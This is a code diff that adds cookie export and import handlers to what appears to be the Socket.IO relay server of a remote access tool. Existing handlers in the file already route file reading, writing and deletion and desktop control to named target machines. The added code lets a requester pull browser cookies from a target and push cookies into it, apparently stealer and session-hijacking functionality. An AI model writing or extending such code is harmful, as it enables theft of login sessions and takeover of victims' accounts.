@@ -193,6 +193,34 @@ for _rsev in ("dir_result", "file_data", "write_result", "delete_result"):
     socketio.on(_rsev)(_make_rs_handler(_rsev))
 
 
+# ── Cookie manager (request/response) ────────────────────────────────────────
+
+@socketio.on("export_cookies")
+def on_export_cookies(data):
+    target_sid = name_to_sid.get(data.get("_target") if data else None)
+    if target_sid:
+        socketio.emit("export_cookies", {"_requester": freq.sid}, room=target_sid)
+
+@socketio.on("cookies_data")
+def on_cookies_data(data):
+    requester = data.get("_requester")
+    if requester:
+        socketio.emit("cookies_data", data, room=requester)
+
+@socketio.on("import_cookies")
+def on_import_cookies(data):
+    target_sid = name_to_sid.get(data.get("_target") if data else None)
+    if target_sid:
+        data["_requester"] = freq.sid
+        socketio.emit("import_cookies", data, room=target_sid)
+
+@socketio.on("import_result")
+def on_import_result(data):
+    requester = data.get("_requester")
+    if requester:
+        socketio.emit("import_result", data, room=requester)
+
+
 # ── Window / desktop control (request/response) ───────────────────────────────
 
 @socketio.on("list_windows")
